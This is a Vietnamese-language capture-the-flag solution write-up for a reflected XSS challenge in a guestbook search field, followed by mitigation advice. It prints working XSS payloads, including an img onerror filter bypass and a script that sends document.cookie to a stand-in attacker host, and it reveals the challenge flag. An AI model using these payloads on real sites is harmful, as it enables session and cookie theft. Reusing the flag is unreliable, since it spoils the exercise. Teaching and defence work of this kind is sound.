# Thử thách 06: GuestBook - Giải pháp

## Loại lỗ hổng
**Cross-Site Scripting (XSS) - Reflected XSS (XSS phản xạ)**

## Mô tả
Tính năng tìm kiếm lấy giá trị nhập vào của người dùng và in trực tiếp ra mã HTML trả về mà không qua bất kỳ khâu xử lý/lọc (escape) nào. Điều này cho phép kẻ tấn công chèn và thực thi mã JavaScript độc hại.

## Mã nguồn chứa lỗ hổng
```python
# VULNERABLE: q injected directly into HTML
search_display = f'<p>Search results for: <b>{q}</b></p>'
```

## Khai thác (Exploit)

1. Flag của admin được giấu trong cookie dưới dạng: `admin_flag=FCTF{xss_st0l3_my_c00k13}`
2. Chúng ta cần tạo một payload XSS để đánh cắp cookie này.
3. Truyền payload sau vào ô tìm kiếm:
   ```html
   <script>alert(document.cookie)</script>
   ```
4. Hoặc để thực sự "đánh cắp" và gửi về server của hacker:
   ```html
   <script>fetch('http://attacker.com/?c='+document.cookie)</script>
   ```

## Payload đơn giản hiển thị cookie
```
?q=<script>alert(document.cookie)</script>
```

## Payload vượt qua một số bộ lọc cơ bản để lấy Flag
```
?q=<img src=x onerror="alert(document.cookie)">
```

## Flag
```
FCTF{xss_st0l3_my_c00k13}
```

## Cách hoạt động
1. Tham số tìm kiếm (q) được nối trực tiếp vào HTML mà không được xử lý (escape).
2. Trình duyệt của nạn nhân sẽ tải mã HTML bị tiêm và chạy đoạn mã JavaScript đó.
3. Script độc hại có thể đọc được cookie, sessionStorage, hoặc thay mặt nạn nhân gửi các request.
4. Trong thực tế, kẻ tấn công sẽ lừa admin nhấp vào đường link chứa sẵn payload để gửi cookie của admin về server của chúng.

## Biện pháp phòng ngừa (Mitigation)
- Luôn xử lý mã hóa (escape/encode) các ký tự đặc biệt của HTML (như `<`, `>`, `&`, `"`, `'`) từ dữ liệu người dùng trước khi in ra giao diện.
- Sử dụng template engine có hỗ trợ auto-escaping (như Jinja2):
  ```python
  search_display = f'<p>Search results for: <b>{html_lib.escape(q)}</b></p>'
  ```
- Cấu hình header Content Security Policy (CSP) để giới hạn nguồn chạy mã JavaScript.
- Thiết lập cờ `HttpOnly` cho các cookie nhạy cảm để chặn JavaScript truy cập vào chúng (`document.cookie`).
- Nên dùng các web framework có sẵn tính năng tự động escape theo mặc định.
- Luôn kiểm tra (validate) và lọc (sanitize) mọi dữ liệu đầu vào của người dùng.
